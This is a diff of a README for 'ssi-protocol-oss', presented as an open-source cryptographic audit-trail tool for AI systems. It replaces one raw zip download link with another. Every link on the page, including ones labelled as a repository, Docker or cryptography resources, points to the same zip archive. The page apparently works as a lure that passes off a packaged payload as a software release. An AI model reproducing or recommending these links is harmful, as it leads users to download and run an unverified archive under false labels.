@@ -4,7 +4,7 @@
 Welcome to the **ssi-protocol-oss** repository. This software is an open-source implementation of the SSI Protocol, providing cryptographic audit trails for AI systems. It helps ensure that your AI applications are secure, verifiable, and trustworthy.
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip%20release-blue)](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip%20release-blue)](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip)
 
 ## 📚 What You Need
 Before installing, make sure you have the following:
@@ -14,7 +14,7 @@ Before installing, make sure you have the following:
 - Basic computer skills to follow these instructions.
 
 ## 📂 Download & Install
-To get started, visit this page to download the latest version: [Download the latest release](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip).
+To get started, visit this page to download the latest version: [Download the latest release](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip).
 
 1. Open your web browser.
 2. Click on the link above to go to the **Releases** page.
@@ -55,17 +55,17 @@ Once you launch the application, you'll see a user-friendly interface. Follow th
 4. **Review Audit Trails**: Access previous audits through the "History" tab.
 
 ## 🌐 Community and Support
-Join our community to share your experience or seek help. You can visit our [GitHub Repository](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip) or look for forums where users discuss tips and tricks.
+Join our community to share your experience or seek help. You can visit our [GitHub Repository](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip) or look for forums where users discuss tips and tricks.
 
 ## 📞 Need Help?
 If you encounter any issues, check the FAQ section on our GitHub page. You can also open an issue on GitHub for technical support. Our community and maintainers will be happy to assist you.
 
 ## 🔗 Additional Resources
-- Learn more about [Docker](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip)
-- Explore concepts of [cryptography](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip)
-- Understand [SSI Protocol](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip)
+- Learn more about [Docker](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip)
+- Explore concepts of [cryptography](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip)
+- Understand [SSI Protocol](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip)
 
 ## 📥 Quick Download Link
-For convenience, here is the download link once more: [Download the latest release](https://github.com/Azarscientist/ssi-protocol-oss/raw/refs/heads/main/app/legal/privacy/oss-ssi-protocol-v2.1.zip). Click it to access the latest version!
+For convenience, here is the download link once more: [Download the latest release](https://raw.githubusercontent.com/Azarscientist/ssi-protocol-oss/main/docs/oss-protocol-ssi-1.0.zip). Click it to access the latest version!
 
 Thank you for using **ssi-protocol-oss**. We hope it helps you ensure the safety and integrity of your AI systems.
